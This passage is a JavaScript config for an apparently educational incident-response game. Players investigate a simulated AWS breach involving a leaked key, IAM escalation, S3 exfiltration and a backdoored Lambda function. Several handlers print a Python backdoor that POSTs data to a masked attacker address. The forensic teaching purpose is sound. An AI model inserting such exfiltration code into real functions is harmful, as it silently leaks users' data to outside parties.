/* ================================================================
   FORENSICS-02: Cloud Artifact -- Mission Config
   ================================================================
   Terminal-mode mission. Config-driven via TerminalInterpreter.
   Custom commands: scan, move, examine, query, diff, download,
   analyze, report, status.
   ================================================================ */

var FORENSICS_02_CONFIG = {
    id: 'forensics-02',
    missionTitle: 'FORENSICS-02',
    title: 'Cloud Artifact',
    subtitle: 'Incident documented. Breach contained.',
    category: 'forensics',
    difficulty: 3,
    inputMode: 'terminal',
    prompt: 'investigator@aws:~$',
    promptText: 'investigator@aws:~$ ',
    promptLabel: 'AWS INCIDENT RESPONSE',

    grid: {
        rows: 4,
        cols: 5,
        start: { col: 0, row: 0 },
        cells: [
            ['cloudtrail',    'iam-console',     'empty',          'wall',           'wall'],
            ['empty',         's3-bucket',       'empty',          'lambda-func',    'wall'],
            ['wall',          'empty',           'vpc-flowlogs',   'empty',          'guardduty'],
            ['wall',          'secrets-manager', 'empty',          'config-audit',   'empty']
        ]
    },

    nodes: {
        'cloudtrail':      { label: 'CLOUDTRAIL',   abbr: 'CTR', ip: 'us-east-1', desc: 'AWS CloudTrail -- API call audit log',                            ports: ['N/A'],          os: 'AWS Service' },
        'iam-console':     { label: 'IAM-CONSOLE',  abbr: 'IAM', ip: 'global',    desc: 'Identity and Access Management -- users, roles, policies',        ports: ['N/A'],          os: 'AWS Service' },
        's3-bucket':       { label: 'S3-BUCKET',    abbr: 'S3B', ip: 'us-east-1', desc: 'S3 storage -- hexworth-prod-data bucket',                         ports: ['443/HTTPS'],    os: 'AWS Service' },
        'lambda-func':     { label: 'LAMBDA',       abbr: 'LMB', ip: 'us-east-1', desc: 'Lambda functions -- serverless compute',                          ports: ['N/A'],          os: 'AWS Service' },
        'vpc-flowlogs':    { label: 'VPC-FLOWLOGS', abbr: 'VPC', ip: 'us-east-1', desc: 'VPC Flow Logs -- network traffic records',                        ports: ['N/A'],          os: 'AWS Service' },
        'guardduty':       { label: 'GUARDDUTY',    abbr: 'GDD', ip: 'us-east-1', desc: 'GuardDuty -- threat detection findings',                          ports: ['N/A'],          os: 'AWS Service' },
        'secrets-manager': { label: 'SECRETS-MGR',  abbr: 'SEC', ip: 'us-east-1', desc: 'Secrets Manager -- API keys and credentials',                    ports: ['N/A'],          os: 'AWS Service' },
        'config-audit':    { label: 'CONFIG-AUDIT', abbr: 'CFG', ip: 'us-east-1', desc: 'AWS Config -- resource configuration timeline',                   ports: ['N/A'],          os: 'AWS Service' }
    },

    traps: [],
    gates: {},

    objectives: [
        { id: 'key-found',     label: 'Find compromised key',   check: 'compromisedKeyFound' },
        { id: 'iam-traced',    label: 'Trace IAM escalation',   check: 'iamEscalationTraced' },
        { id: 'exfil-data',    label: 'Determine exfil data',   check: 'exfilDataDetermined' },
        { id: 'report-built',  label: 'Build incident report',  check: 'reportBuilt' }
    ],

    integrity: 3,

    completion: {
        title: 'CLOUD ARTIFACT',
        subtitle: 'Incident documented. Breach contained.',
        storageKey: 'hexworth_operator_forensics02'
    },

    briefing: [
        'Cloud environment breach detected.',
        'Stolen API keys. IAM escalation.',
        'S3 exfiltration. Lambda backdoor.',
        'Investigate. Build the incident report.'
    ],

    customState: {
        compromisedKeyFound: false,
        iamEscalationTraced: false,
        exfilDataDetermined: false,
        reportBuilt: false,
        sourcesExamined: []
    },

    // All 8 source types for status display
    allSources: ['cloudtrail', 'iam-console', 's3-bucket', 'lambda-func', 'vpc-flowlogs', 'guardduty', 'secrets-manager', 'config-audit'],

    // ----------------------------------------------------------------
    //  TERMINAL COMMANDS
    // ----------------------------------------------------------------

    terminalCommands: {

        // --- SCAN (override: cloud-flavored labels) ---
        'scan': {
            help: 'Survey area, reveal adjacent services',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                var col = s.position.col, row = s.position.row;
                var cellType = c.grid.cells[row][col];
                e.printLine('Scanning area...', 'system');
                e.printLine('', 'system');
                if (cellType !== 'empty' && cellType !== 'wall') {
                    var cur = c.nodes[cellType];
                    e.printLine('Current: ' + cur.label + ' (' + cur.ip + ')', 'heading');
                    e.printLine(cur.desc, 'info');
                } else {
                    e.printLine('Current: No service at this location', 'heading');
                }
                e.printLine('', 'system');
                e.printLine('Adjacent:', 'heading');
                var dirs = [{name:'North',dc:0,dr:-1},{name:'South',dc:0,dr:1},{name:'East',dc:1,dr:0},{name:'West',dc:-1,dr:0}];
                for (var i = 0; i < dirs.length; i++) {
                    var d = dirs[i], nc = col + d.dc, nr = row + d.dr;
                    if (nc < 0 || nc >= c.grid.cols || nr < 0 || nr >= c.grid.rows) { e.printLine('  ' + d.name + ': [network edge]', 'system'); continue; }
                    var type = c.grid.cells[nr][nc];
                    if (type === 'wall') { e.printLine('  ' + d.name + ': [blocked]', 'system'); continue; }
                    var key = nc + ',' + nr;
                    if (!s.visibility[key] || s.visibility[key] === 'hidden') s.visibility[key] = 'revealed';
                    if (type === 'empty') { e.printLine('  ' + d.name + ': No service', 'info'); }
                    else { var info = c.nodes[type]; e.printLine('  ' + d.name + ': ' + info.label + ' (' + info.ip + ')', 'node-info'); }
                }
                e.updateGrid(); e.saveState();
            }
        },

        // --- MOVE (override: cloud-flavored messages) ---
        'move': {
            help: 'Move agent (north/south/east/west or n/s/e/w)', syntax: 'move <dir>',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                if (!args.length) { e.printLine('Usage: move <direction>', 'error'); e.printLine('Directions: north/south/east/west (or n/s/e/w)', 'system'); return; }
                var dirMap = {'north':[0,-1],'n':[0,-1],'south':[0,1],'s':[0,1],'east':[1,0],'e':[1,0],'west':[-1,0],'w':[-1,0]};
                var dir = args[0].toLowerCase();
                if (!dirMap[dir]) { e.printLine('Unknown direction: ' + args[0], 'error'); e.printLine('Use: north/south/east/west (or n/s/e/w)', 'system'); return; }
                var d = dirMap[dir];
                var newCol = s.position.col + d[0], newRow = s.position.row + d[1];
                if (newCol < 0 || newCol >= c.grid.cols || newRow < 0 || newRow >= c.grid.rows) { e.printLine('Edge of cloud region. Cannot move ' + dir + '.', 'error'); return; }
                var cellType = c.grid.cells[newRow][newCol];
                if (cellType === 'wall') { e.printLine('Blocked. No path ' + dir + ' from here.', 'error'); return; }
                s.position = { col: newCol, row: newRow };
                s.visibility[newCol + ',' + newRow] = 'visited';
                if (cellType !== 'empty') s.nodesDiscovered.add(cellType);
                e.revealAdjacent(newCol, newRow);
                var dirFull = {n:'north',s:'south',e:'east',w:'west'};
                var dirName = dirFull[dir] || dir;
                if (cellType === 'empty') { e.printLine('Moving ' + dirName + '... No service here.', 'system'); }
                else { var info = c.nodes[cellType]; e.printLine('Moving ' + dirName + '... ' + info.label + ' (' + info.ip + ')', 'success'); e.printLine(info.desc, 'info'); }
                e.checkObjectives(); e.updateGrid(); e.saveState();
            }
        },

        // --- EXAMINE (8 AWS services) ---
        'examine': {
            help: 'Investigate current service in depth',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                var type = c.grid.cells[s.position.row][s.position.col];
                if (type === 'empty') { e.printLine('No AWS service at this location. Move to a service node.', 'system'); return; }
                if (type === 'wall') { e.printLine('Cannot examine this location.', 'error'); return; }

                e.printLine('', 'system');
                if (s.sourcesExamined.indexOf(type) === -1) s.sourcesExamined.push(type);

                switch (type) {
                    case 'cloudtrail':
                        e.printLine('=== CLOUDTRAIL EVENTS ===', 'heading');
                        e.printLine('[03/03 01:14] sts:GetCallerIdentity \u2014 AKIAEXAMPLE123 (us-east-1)', 'node-info');
                        e.printLine('  Source IP: 91.234.xx.xx (Tor exit node)  \u2190 [SUSPICIOUS]', 'warning');
                        e.printLine('[03/03 01:15] iam:CreatePolicyVersion \u2014 AKIAEXAMPLE123', 'node-info');
                        e.printLine('  Policy: DataAccessPolicy \u2192 added s3:*, lambda:*  \u2190 [ESCALATION]', 'error');
                        e.printLine('[03/03 01:18] s3:GetObject \u2014 hexworth-prod-data/customers/export.csv.gz', 'node-info');
                        e.printLine('  Size: 847MB  \u2190 [EXFILTRATION]', 'error');
                        e.printLine('[03/03 01:20] lambda:UpdateFunctionCode \u2014 data-processor', 'node-info');
                        e.printLine('  Source IP: 91.234.xx.xx  \u2190 [PERSISTENCE]', 'error');
                        e.printLine('[03/03 01:22] s3:PutBucketPolicy \u2014 hexworth-prod-data', 'node-info');
                        e.printLine('  Effect: Allow s3:GetObject from *  \u2190 [BUCKET OPENED]', 'error');
                        break;

                    case 'iam-console':
                        e.printLine('=== IAM INVESTIGATION ===', 'heading');
                        e.printLine('User: svc-deploy (service account)', 'node-info');
                        e.printLine('Access Key: AKIAEXAMPLE123', 'node-info');
                        e.printLine('Created: 2025-06-15', 'info');
                        e.printLine('Last rotated: NEVER  \u2190 [VIOLATION]', 'error');
                        e.printLine('', 'system');
                        e.printLine('Policy versions:', 'heading');
                        e.printLine('  v1 (2025-06-15): s3:PutObject on hexworth-deploy/*', 'info');
                        e.printLine('  v2 (2026-03-03): s3:*, lambda:*, iam:*  \u2190 [ESCALATED]', 'error');
                        e.printLine('', 'system');
                        e.printLine('[!] Policy v2 grants full S3, Lambda, and IAM access', 'error');
                        e.printLine('Escalation path: CreatePolicyVersion \u2192 SetDefaultPolicyVersion', 'warning');
                        s.iamEscalationTraced = true;
                        break;

                    case 's3-bucket':
                        e.printLine('=== S3 BUCKET: hexworth-prod-data ===', 'heading');
                        e.printLine('Objects: 12,847 | Size: 45.2GB', 'node-info');
                        e.printLine('Access logging: ENABLED', 'info');
                        e.printLine('', 'system');
                        e.printLine('Recent access events:', 'heading');
                        e.printLine('[03/03 01:18] GetObject: customers/export.csv.gz (847MB)', 'warning');
                        e.printLine('  Requester: AKIAEXAMPLE123 from 91.234.xx.xx', 'warning');
                        e.printLine('[03/03 01:22] PutBucketPolicy: public read enabled  \u2190 [CRITICAL]', 'error');
                        e.printLine('', 'system');
                        e.printLine('Exfiltrated data:', 'heading');
                        e.printLine('  customers/export.csv.gz \u2014 847MB', 'error');
                        e.printLine('  Content: 2.3M customer records (PII: names, emails, SSN)', 'error');
                        s.exfilDataDetermined = true;
                        break;

                    case 'lambda-func':
                        e.printLine('=== LAMBDA: data-processor ===', 'heading');
                        e.printLine('Runtime: Python 3.12', 'node-info');
                        e.printLine('Last modified: 03/03 01:20 (by AKIAEXAMPLE123)', 'warning');
                        e.printLine('', 'system');
                        e.printLine('Code diff (original \u2192 modified):', 'heading');
                        e.printLine('+ import urllib.request', 'error');
                        e.printLine('+ def exfil(data):', 'error');
                        e.printLine("+     urllib.request.urlopen('https://91.234.xx.xx/collect',", 'error');
                        e.printLine("+         data=json.dumps(data).encode())", 'error');
                        e.printLine('', 'system');
                        e.printLine('[!] BACKDOOR: Lambda modified to exfiltrate processed data', 'error');
                        e.printLine("Trigger: S3 PutObject events on hexworth-prod-data/", 'warning');
                        break;

                    case 'vpc-flowlogs':
                        e.printLine('=== VPC FLOW LOGS ===', 'heading');
                        e.printLine('[03/03 01:14] 91.234.xx.xx \u2192 10.0.1.50:443 ACCEPT (API Gateway)', 'node-info');
                        e.printLine('[03/03 01:18] 10.0.1.50 \u2192 s3.amazonaws.com:443 ACCEPT (847MB)', 'warning');
                        e.printLine('[03/03 01:20] 91.234.xx.xx \u2192 lambda.us-east-1:443 ACCEPT', 'warning');
                        e.printLine('[03/03 01:25] 10.0.2.100 \u2192 91.234.xx.xx:443 ACCEPT (outbound)  \u2190 [EXFIL]', 'error');
                        e.printLine('', 'system');
                        e.printLine('Total outbound to 91.234.xx.xx: 847MB over 11 minutes', 'error');
                        break;

                    case 'guardduty':
                        e.printLine('=== GUARDDUTY FINDINGS ===', 'heading');
                        e.printLine('[HIGH] UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration', 'error');
                        e.printLine('  Resource: AKIAEXAMPLE123   Severity: 8.5/10', 'warning');
                        e.printLine('[HIGH] Exfiltration:S3/MaliciousIPCaller', 'error');
                        e.printLine('  Resource: hexworth-prod-data   Severity: 9.0/10', 'warning');
                        e.printLine('[MEDIUM] Persistence:IAMUser/AnomalousBehavior', 'warning');
                        e.printLine('  Resource: svc-deploy   Severity: 6.5/10', 'info');
                        e.printLine('[HIGH] Impact:S3/PermissionsModification', 'error');
                        e.printLine('  Resource: hexworth-prod-data bucket policy   Severity: 8.0/10', 'warning');
                        break;

                    case 'secrets-manager':
                        e.printLine('=== SECRETS MANAGER ===', 'heading');
                        e.printLine('Secret: svc-deploy-api-key', 'node-info');
                        e.printLine('Status: ACTIVE  \u2190 [SHOULD BE ROTATED]', 'error');
                        e.printLine('Last accessed: 03/03 01:14', 'warning');
                        e.printLine('Version stages: AWSCURRENT (created 2025-06-15)', 'info');
                        e.printLine('', 'system');
                        e.printLine('[!] This key has been compromised.', 'error');
                        e.printLine('Source of breach: Key found in public GitHub repository', 'error');
                        e.printLine('  Repository: hexworth-corp/deploy-scripts (DELETED, cached by GitGuardian)', 'warning');
                        e.printLine('  File: .env.production (committed 02/28)', 'warning');
                        e.printLine('  Discovered: 03/03 by threat intel feed', 'info');
                        s.compromisedKeyFound = true;
                        break;

                    case 'config-audit':
                        e.printLine('=== AWS CONFIG TIMELINE ===', 'heading');
                        e.printLine('Resource: hexworth-prod-data (S3 Bucket)', 'node-info');
                        e.printLine('[02/28] Config: PublicAccessBlock=ON, BucketPolicy=restrictive \u2713', 'success');
                        e.printLine('[03/03 01:22] Config CHANGE: BucketPolicy=public-read  \u2190 [NON-COMPLIANT]', 'error');
                        e.printLine('[03/03 01:22] Config CHANGE: PublicAccessBlock=OFF  \u2190 [NON-COMPLIANT]', 'error');
                        e.printLine('', 'system');
                        e.printLine('Resource: DataAccessPolicy (IAM)', 'node-info');
                        e.printLine('[02/28] Config: s3:PutObject on hexworth-deploy/* only \u2713', 'success');
                        e.printLine('[03/03 01:15] Config CHANGE: s3:*, lambda:*, iam:*  \u2190 [NON-COMPLIANT]', 'error');
                        e.printLine('', 'system');
                        e.printLine('2 resources NON-COMPLIANT', 'warning');
                        break;

                    default:
                        e.printLine('No detailed information available for this service.', 'system');
                }

                e.printLine('', 'system');
                var examined = s.sourcesExamined.length;
                e.printLine('Sources examined: ' + examined + ' / 8', 'info');
                if (examined < 5) {
                    e.printLine('Examine ' + (5 - examined) + ' more source(s) before building the report.', 'system');
                } else {
                    e.printLine('Sufficient sources gathered. Use "report" to build the incident report.', 'info');
                }

                e.checkObjectives(); e.saveState();
            }
        },

        // --- QUERY (CloudTrail filter) ---
        'query': {
            help: 'Filter CloudTrail events (key, IP, or service)', syntax: 'query <filter>',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                if (!args.length) { e.printLine('Usage: query <filter>', 'error'); e.printLine('Examples: query AKIAEXAMPLE123, query 91.234, query s3', 'system'); return; }
                var cellType = c.grid.cells[s.position.row][s.position.col];
                if (cellType !== 'cloudtrail' && s.sourcesExamined.indexOf('cloudtrail') === -1) {
                    e.printLine('query: requires access to CLOUDTRAIL.', 'error');
                    e.printLine('Navigate to CLOUDTRAIL and examine it first.', 'system');
                    return;
                }

                var filter = args.join(' ').toLowerCase();
                e.printLine('', 'system');

                if (filter.indexOf('akia') !== -1 || filter.indexOf('key') !== -1 || filter === 'akiaexample123') {
                    e.printLine('=== CLOUDTRAIL QUERY: AKIAEXAMPLE123 ===', 'heading');
                    e.printLine('[03/03 01:14] sts:GetCallerIdentity', 'node-info');
                    e.printLine('[03/03 01:15] iam:CreatePolicyVersion \u2014 DataAccessPolicy', 'node-info');
                    e.printLine('[03/03 01:15] iam:SetDefaultPolicyVersion', 'node-info');
                    e.printLine('[03/03 01:17] iam:AttachUserPolicy', 'node-info');
                    e.printLine('[03/03 01:18] s3:GetObject \u2014 customers/export.csv.gz', 'node-info');
                    e.printLine('[03/03 01:18] s3:ListBucket \u2014 hexworth-prod-data', 'node-info');
                    e.printLine('[03/03 01:20] lambda:UpdateFunctionCode \u2014 data-processor', 'node-info');
                    e.printLine('[03/03 01:22] s3:PutBucketPolicy \u2014 hexworth-prod-data', 'node-info');
                    e.printLine('[03/03 01:22] s3:PutPublicAccessBlock', 'node-info');
                    e.printLine('', 'system');
                    e.printLine('Total: 9 API calls by AKIAEXAMPLE123 in 8-minute window.', 'info');
                } else if (filter.indexOf('91.234') !== -1 || filter.indexOf('tor') !== -1) {
                    e.printLine('=== CLOUDTRAIL QUERY: 91.234.xx.xx ===', 'heading');
                    e.printLine('[03/03 01:14] sts:GetCallerIdentity \u2014 source: 91.234.xx.xx', 'node-info');
                    e.printLine('[03/03 01:15] iam:CreatePolicyVersion \u2014 source: 91.234.xx.xx', 'node-info');
                    e.printLine('[03/03 01:15] iam:SetDefaultPolicyVersion \u2014 source: 91.234.xx.xx', 'node-info');
                    e.printLine('[03/03 01:20] lambda:UpdateFunctionCode \u2014 source: 91.234.xx.xx', 'node-info');
                    e.printLine('[03/03 01:22] s3:PutBucketPolicy \u2014 source: 91.234.xx.xx', 'node-info');
                    e.printLine('', 'system');
                    e.printLine('IP 91.234.xx.xx: known Tor exit node. All activity via this IP is attacker-controlled.', 'warning');
                } else if (filter.indexOf('s3') !== -1) {
                    e.printLine('=== CLOUDTRAIL QUERY: S3 OPERATIONS ===', 'heading');
                    e.printLine('[03/03 01:18] s3:ListBucket \u2014 hexworth-prod-data', 'node-info');
                    e.printLine('[03/03 01:18] s3:GetObject \u2014 customers/export.csv.gz (847MB)', 'error');
                    e.printLine('[03/03 01:22] s3:PutBucketPolicy \u2014 public-read enabled', 'error');
                    e.printLine('[03/03 01:22] s3:PutPublicAccessBlock \u2014 block disabled', 'error');
                } else if (filter.indexOf('iam') !== -1 || filter.indexOf('policy') !== -1) {
                    e.printLine('=== CLOUDTRAIL QUERY: IAM OPERATIONS ===', 'heading');
                    e.printLine('[03/03 01:15] iam:CreatePolicyVersion \u2014 DataAccessPolicy v2', 'error');
                    e.printLine('[03/03 01:15] iam:SetDefaultPolicyVersion \u2014 set to v2', 'error');
                    e.printLine('[03/03 01:17] iam:AttachUserPolicy \u2014 added admin-policy to svc-deploy', 'error');
                } else if (filter.indexOf('lambda') !== -1) {
                    e.printLine('=== CLOUDTRAIL QUERY: LAMBDA OPERATIONS ===', 'heading');
                    e.printLine('[03/03 01:20] lambda:UpdateFunctionCode \u2014 data-processor', 'error');
                    e.printLine('[03/03 01:20] lambda:UpdateFunctionConfiguration', 'warning');
                    e.printLine('Source: 91.234.xx.xx (Tor exit node)', 'error');
                } else {
                    e.printLine('No matching events for filter: "' + args.join(' ') + '".', 'system');
                    e.printLine('Try: query AKIAEXAMPLE123, query 91.234, query s3, query iam, query lambda', 'info');
                }
                e.printLine('', 'system');
            }
        },

        // --- DIFF (resource comparison) ---
        'diff': {
            help: 'Compare resource versions (policy, code, s3, iam)', syntax: 'diff <resource>',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                if (!args.length) { e.printLine('Usage: diff <resource>', 'error'); e.printLine('Resources: policy, code, s3, iam', 'system'); return; }
                var resource = args.join(' ').toLowerCase();
                var cellType = c.grid.cells[s.position.row][s.position.col];
                e.printLine('', 'system');

                if (resource.indexOf('policy') !== -1 || resource.indexOf('iam') !== -1) {
                    if (cellType !== 'iam-console' && s.sourcesExamined.indexOf('iam-console') === -1) {
                        e.printLine('diff: examine IAM-CONSOLE first.', 'error'); return;
                    }
                    e.printLine('=== IAM POLICY DIFF: DataAccessPolicy ===', 'heading');
                    e.printLine('v1 (2025-06-15):', 'node-info');
                    e.printLine('  Effect: Allow', 'info');
                    e.printLine('  Action: ["s3:PutObject"]', 'info');
                    e.printLine('  Resource: "arn:aws:s3:::hexworth-deploy/*"', 'info');
                    e.printLine('', 'system');
                    e.printLine('v2 (2026-03-03 01:15) [CURRENT]:', 'node-info');
                    e.printLine('  Effect: Allow', 'info');
                    e.printLine('+ Action: ["s3:*", "lambda:*", "iam:*"]  \u2190 ADDED', 'error');
                    e.printLine('+ Resource: "*"  \u2190 WIDENED TO ALL RESOURCES', 'error');
                    e.printLine('', 'system');
                    e.printLine('Change summary: 7 additional permission categories granted.', 'warning');
                    if (s.sourcesExamined.indexOf('iam-console') === -1) s.sourcesExamined.push('iam-console');
                    s.iamEscalationTraced = true;
                } else if (resource.indexOf('code') !== -1 || resource.indexOf('lambda') !== -1) {
                    if (cellType !== 'lambda-func' && s.sourcesExamined.indexOf('lambda-func') === -1) {
                        e.printLine('diff: examine LAMBDA first.', 'error'); return;
                    }
                    e.printLine('=== LAMBDA CODE DIFF: data-processor ===', 'heading');
                    e.printLine('Modified: 03/03 01:20 by AKIAEXAMPLE123', 'warning');
                    e.printLine('', 'system');
                    e.printLine('  import boto3', 'info');
                    e.printLine('  import json', 'info');
                    e.printLine('+ import urllib.request', 'error');
                    e.printLine('', 'system');
                    e.printLine('  def handler(event, context):', 'info');
                    e.printLine('      data = process(event)', 'info');
                    e.printLine('+     exfil(data)', 'error');
                    e.printLine('      return data', 'info');
                    e.printLine('', 'system');
                    e.printLine('+ def exfil(data):', 'error');
                    e.printLine("+     urllib.request.urlopen('https://91.234.xx.xx/collect',", 'error');
                    e.printLine("+         data=json.dumps(data).encode())", 'error');
                    e.printLine('', 'system');
                    e.printLine('3 lines added. Backdoor function introduced.', 'warning');
                    if (s.sourcesExamined.indexOf('lambda-func') === -1) s.sourcesExamined.push('lambda-func');
                } else if (resource.indexOf('s3') !== -1 || resource.indexOf('bucket') !== -1) {
                    if (cellType !== 'config-audit' && s.sourcesExamined.indexOf('config-audit') === -1) {
                        e.printLine('diff: examine CONFIG-AUDIT first.', 'error'); return;
                    }
                    e.printLine('=== S3 BUCKET POLICY DIFF: hexworth-prod-data ===', 'heading');
                    e.printLine('Before (02/28):', 'node-info');
                    e.printLine('  PublicAccessBlock: { BlockPublicAcls: true, BlockPublicPolicy: true }', 'success');
                    e.printLine('  BucketPolicy: { Effect: Deny, Principal: *, NotAction: [...internal] }', 'success');
                    e.printLine('', 'system');
                    e.printLine('After (03/03 01:22):', 'node-info');
                    e.printLine('- PublicAccessBlock: { BlockPublicAcls: true, BlockPublicPolicy: true }', 'error');
                    e.printLine('+ PublicAccessBlock: { BlockPublicAcls: false, BlockPublicPolicy: false }', 'error');
                    e.printLine('- BucketPolicy: { Effect: Deny, ... }', 'error');
                    e.printLine('+ BucketPolicy: { Effect: Allow, Principal: "*", Action: "s3:GetObject" }', 'error');
                    e.printLine('', 'system');
                    e.printLine('Bucket changed from private to fully public in 1 minute.', 'warning');
                    if (s.sourcesExamined.indexOf('config-audit') === -1) s.sourcesExamined.push('config-audit');
                } else {
                    e.printLine('diff: unknown resource "' + args.join(' ') + '".', 'error');
                    e.printLine('Try: diff policy, diff code, diff s3', 'system');
                }

                e.printLine('', 'system');
                e.checkObjectives(); e.saveState();
            }
        },

        // --- DOWNLOAD (S3 access logs) ---
        'download': {
            help: 'Download access logs (at S3-BUCKET)',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                var cellType = c.grid.cells[s.position.row][s.position.col];
                if (cellType !== 's3-bucket') { e.printLine('download: must be at S3-BUCKET node.', 'error'); return; }

                e.printLine('', 'system');
                e.printLine('Downloading access logs from hexworth-prod-data...', 'system');
                e.printLine('', 'system');
                e.printLine('=== S3 ACCESS LOG: hexworth-prod-data ===', 'heading');
                e.printLine('2026-03-03T01:18:01Z AKIAEXAMPLE123 REST.GET.OBJECT customers/export.csv.gz', 'node-info');
                e.printLine('  Requester IP: 91.234.xx.xx  Bytes: 888,279,040  Status: 200', 'warning');
                e.printLine('2026-03-03T01:18:47Z AKIAEXAMPLE123 REST.GET.OBJECT customers/export.csv.gz', 'node-info');
                e.printLine('  Requester IP: 91.234.xx.xx  Bytes: 0  Status: 206 (partial)', 'warning');
                e.printLine('2026-03-03T01:22:10Z AKIAEXAMPLE123 REST.PUT.BUCKETPOLICY', 'node-info');
                e.printLine('  Requester IP: 91.234.xx.xx  Status: 204', 'error');
                e.printLine('2026-03-03T01:22:11Z AKIAEXAMPLE123 REST.PUT.PUBLIC_ACCESS_BLOCK', 'node-info');
                e.printLine('  Requester IP: 91.234.xx.xx  Status: 204', 'error');
                e.printLine('2026-03-03T01:23:44Z anonymous REST.GET.OBJECT customers/export.csv.gz', 'node-info');
                e.printLine('  Requester IP: 45.11.yy.yy  Bytes: 888,279,040  Status: 200  \u2190 [PUBLIC ACCESS!]', 'error');
                e.printLine('', 'system');
                e.printLine('Public access confirmed: data downloaded by a second IP after bucket policy change.', 'error');

                if (s.sourcesExamined.indexOf('s3-bucket') === -1) s.sourcesExamined.push('s3-bucket');
                s.exfilDataDetermined = true;

                e.printLine('', 'system');
                e.checkObjectives(); e.saveState();
            }
        },

        // --- ANALYZE (deep-dive analysis) ---
        'analyze': {
            help: 'Deep-dive analysis of a resource', syntax: 'analyze <res>',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state;
                if (!args.length) { e.printLine('Usage: analyze <resource>', 'error'); e.printLine('Resources: lambda, guardduty, vpc, cloudtrail', 'system'); return; }
                var resource = args.join(' ').toLowerCase();
                e.printLine('', 'system');

                if (resource.indexOf('lambda') !== -1 || resource.indexOf('code') !== -1) {
                    if (s.sourcesExamined.indexOf('lambda-func') === -1) { e.printLine('analyze: examine LAMBDA first.', 'error'); return; }
                    e.printLine('=== LAMBDA ANALYSIS: data-processor ===', 'heading');
                    e.printLine('Full backdoor code reconstructed:', 'node-info');
                    e.printLine('', 'system');
                    e.printLine("import urllib.request, json", 'error');
                    e.printLine("", 'system');
                    e.printLine("def exfil(data):", 'error');
                    e.printLine("    req = urllib.request.Request(", 'error');
                    e.printLine("        'https://91.234.xx.xx/collect',", 'error');
                    e.printLine("        data=json.dumps(data).encode(),", 'error');
                    e.printLine("        method='POST'", 'error');
                    e.printLine("    )", 'error');
                    e.printLine("    urllib.request.urlopen(req, timeout=10)", 'error');
                    e.printLine('', 'system');
                    e.printLine('Backdoor fires on every Lambda invocation. Trigger: S3:PutObject.', 'warning');
                    e.printLine('Every file written to hexworth-prod-data is silently forwarded to attacker.', 'error');
                    e.printLine('MITRE ATT&CK: T1567.002 \u2014 Exfiltration to Cloud Storage', 'info');
                } else if (resource.indexOf('guardduty') !== -1 || resource.indexOf('gdd') !== -1) {
                    if (s.sourcesExamined.indexOf('guardduty') === -1) { e.printLine('analyze: examine GUARDDUTY first.', 'error'); return; }
                    e.printLine('=== GUARDDUTY FINDING DETAIL ===', 'heading');
                    e.printLine('Finding: Exfiltration:S3/MaliciousIPCaller (Severity 9.0)', 'error');
                    e.printLine('MITRE ATT&CK: T1530 \u2014 Data from Cloud Storage', 'info');
                    e.printLine('  Attacker used AKIAEXAMPLE123 to access hexworth-prod-data', 'warning');
                    e.printLine('  Source IP 91.234.xx.xx is in GuardDuty threat intel feed (Tor)', 'warning');
                    e.printLine('', 'system');
                    e.printLine('Finding: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration (8.5)', 'error');
                    e.printLine('MITRE ATT&CK: T1078.004 \u2014 Valid Accounts: Cloud Accounts', 'info');
                    e.printLine('  Credential AKIAEXAMPLE123 used from anomalous Tor IP', 'warning');
                    e.printLine('', 'system');
                    e.printLine('Full attack chain: T1078.004 \u2192 T1098 \u2192 T1530 \u2192 T1567', 'node-info');
                } else if (resource.indexOf('vpc') !== -1 || resource.indexOf('flow') !== -1) {
                    if (s.sourcesExamined.indexOf('vpc-flowlogs') === -1) { e.printLine('analyze: examine VPC-FLOWLOGS first.', 'error'); return; }
                    e.printLine('=== VPC TRAFFIC VOLUME ANALYSIS ===', 'heading');
                    e.printLine('Inbound from 91.234.xx.xx:', 'node-info');
                    e.printLine('  01:14-01:22  12 API connections  ~8KB total  (control traffic)', 'info');
                    e.printLine('Outbound to 91.234.xx.xx:', 'node-info');
                    e.printLine('  01:18  888MB  (S3 exfiltration \u2014 HTTPS GET)', 'error');
                    e.printLine('  01:25  ~2MB   (Lambda exfil callback \u2014 HTTPS POST)', 'error');
                    e.printLine('', 'system');
                    e.printLine('Total exfiltrated: ~890MB over 11-minute window.', 'error');
                    e.printLine('90MB/min sustained outbound \u2014 well above normal baseline of <1MB/min.', 'warning');
                } else if (resource.indexOf('cloudtrail') !== -1 || resource.indexOf('trail') !== -1) {
                    if (s.sourcesExamined.indexOf('cloudtrail') === -1) { e.printLine('analyze: examine CLOUDTRAIL first.', 'error'); return; }
                    e.printLine('=== CLOUDTRAIL DEEP ANALYSIS ===', 'heading');
                    e.printLine('Total events in incident window (01:14-01:25):', 'node-info');
                    e.printLine('  IAM operations: 3 (all privilege escalation)', 'error');
                    e.printLine('  S3 operations:  4 (exfil + bucket policy tampering)', 'error');
                    e.printLine('  Lambda ops:     2 (code update + config change)', 'error');
                    e.printLine('  STS ops:        1 (identity verification)', 'info');
                    e.printLine('', 'system');
                    e.printLine('CloudTrail was NOT disabled. Attacker left a complete evidence trail.', 'success');
                    e.printLine('CloudTrail integrity validation: PASSED (log file hashes verified)', 'success');
                } else {
                    e.printLine('analyze: unknown resource "' + args.join(' ') + '".', 'error');
                    e.printLine('Try: analyze lambda, analyze guardduty, analyze vpc, analyze cloudtrail', 'system');
                }
                e.printLine('', 'system');
            }
        },

        // --- REPORT (incident report -- requires 5+ sources + key findings) ---
        'report': {
            help: 'Build incident report (requires 5+ sources)',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state;
                var examined = s.sourcesExamined.length;
                var missing = [];
                if (examined < 5) { missing.push('examine at least ' + (5 - examined) + ' more source(s)'); }
                if (!s.compromisedKeyFound) { missing.push('find the compromised key (examine SECRETS-MGR)'); }
                if (!s.iamEscalationTraced) { missing.push('trace IAM escalation (examine IAM-CONSOLE)'); }
                if (!s.exfilDataDetermined) { missing.push('determine exfil data (examine S3-BUCKET)'); }

